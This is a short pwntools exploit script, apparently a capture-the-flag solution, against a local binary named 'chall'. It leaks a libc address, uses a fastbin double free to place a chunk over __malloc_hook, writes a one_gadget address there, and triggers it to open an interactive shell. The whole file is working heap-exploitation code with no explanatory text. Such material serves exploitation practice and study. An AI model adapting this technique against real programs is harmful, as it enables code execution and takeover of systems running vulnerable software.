from pwn import *
#libc=ELF('/lib/x86_64-linux-gun/libc-2.23.so')
#log.warning(hex(base))

context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(c):
	cmd(1)
	p.sendlineafter(": ",str(c))
def free(idx):
	cmd(3)
	p.sendlineafter("id:",str(idx))
p=process("./chall")
p.readuntil("ress:")
libc=ELF("./chall").libc
base=int(p.readline()[:-1],16)-libc.symbols['setbuf']
log.warning(hex(base))
add("A")
add("B")
free(0)
free(1)
free(0)
add(p64(libc.symbols['__malloc_hook']+base-35))
gdb.attach(p)
add("C")
add("D")
add('\x00'*19+p64(base+0xf02a4))
free(0)
free(0)


p.interactive()
